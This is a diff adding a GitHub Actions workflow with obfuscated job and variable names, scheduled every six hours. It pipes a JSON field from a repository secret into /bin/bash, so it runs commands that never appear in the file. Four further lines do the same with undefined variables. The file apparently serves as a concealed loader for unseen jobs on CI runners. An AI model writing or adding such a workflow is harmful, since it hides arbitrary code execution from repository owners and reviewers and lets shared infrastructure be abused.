@@ -1,0 +1,23 @@
+name: nihongpiao6713
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: nihongpiao6713
+        env:
+          gb7: ${{ secrets.gb7 }}
+        run: |
+          echo $gb7 | jq -r .hbrqp972 | /bin/bash
+          echo $utk70 | jq -r .rdi2 | /bin/bash
+          echo $c58 | jq -r .nht1713 | /bin/bash
+          echo $vtooq06127 | jq -r .oo16 | /bin/bash
+          echo $mk8433 | jq -r .jsf4 | /bin/bash
+
